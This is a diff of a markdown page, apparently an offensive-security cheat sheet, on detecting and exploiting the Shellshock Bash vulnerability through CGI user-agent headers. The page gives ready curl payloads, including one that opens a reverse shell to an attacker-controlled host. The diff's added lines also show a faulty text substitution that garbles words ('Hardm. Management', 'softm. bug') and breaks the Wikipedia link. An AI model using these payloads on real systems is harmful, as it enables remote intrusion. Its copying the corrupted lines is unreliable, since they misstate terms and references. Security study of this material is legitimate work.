@@ -15,7 +15,7 @@ Shellshock ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) is 
 GNU Bourne Again Shell, or Bash, is an interpreter that allows users to send commands on Unix and Linux systems, typically by connecting over SSH or Telnet but it can also operate as a parser for CGI scripts.
 
 {{<hint info>}}
-In addition to CGI-based web servers, it also affects OpenSSH servers, DHCP clients, Qmail servers and restricted shells of the IBM Hardware Management Console (IBM HMC)
+In addition to CGI-based web servers, it also affects OpenSSH servers, DHCP clients, Qmail servers and restricted shells of the IBM Hardm. Management Console (IBM HMC)
 {{</hint>}}
 
 The vulnerability occurs when the variables sent to the server, are passed and interpreted by Bash. This variable involves a specially crafted environment variable containing an exported function definition, followed by arbitrary commands. Bash incorrectly executes the trailing commands when it imports the function.
@@ -39,13 +39,13 @@ function definition                          Expected command
 #### Reflected
 
 ```sh
-curl -fs -H "user-agent: () { :; }; echo; echo 'vulnerable'" http://{{< param "war.rhost" >}}/cgi-bin/vulnerable | grep vulnerable
+curl -fs -H "user-agent: () { :; }; echo; echo 'vulnerable'" http://{{< param "m.RHOST" >}}/cgi-bin/vulnerable | grep vulnerable
 ```
 
 #### Blind
 
 ```sh
-curl -fs -H "user-agent: () { :; }; /bin/bash -c 'sleep 5'" http://{{< param "war.rhost" >}}/cgi-bin/vulnerable
+curl -fs -H "user-agent: () { :; }; /bin/bash -c 'sleep 5'" http://{{< param "m.RHOST" >}}/cgi-bin/vulnerable
 ```
 
 {{<details "Parameters">}}
@@ -57,12 +57,12 @@ curl -fs -H "user-agent: () { :; }; /bin/bash -c 'sleep 5'" http://{{< param "wa
 ### Exploit
 
 ```sh
-curl -fs -H "user-agent: () { :; }; /bin/bash -i >& /dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}} 0>&1" http://{{< param "war.rhost" >}}/cgi-bin/vulnerable
+curl -fs -H "user-agent: () { :; }; /bin/bash -i >& /dev/tcp/{{< param "m.LHOST" >}}/{{< param "m.LPORT" >}} 0>&1" http://{{< param "m.RHOST" >}}/cgi-bin/vulnerable
 ```
 
 ## Further Reading
 
 - [Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)
-- [Wikipedia - Shellshock (software bug)](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
+- [Wikipedia - Shellshock (softm. bug)](https://en.wikipedia.org/wiki/Shellshock_(softm._BUG))
 
 [^oreilly-cgi]: Gundavaram, Shishir. “The Common Gateway Interface (CGI).” O’Reilly Media - Technology and Business Training, O’Reilly & Associates, Inc., https://www.oreilly.com/openbook/cgi/ch01_01.html.
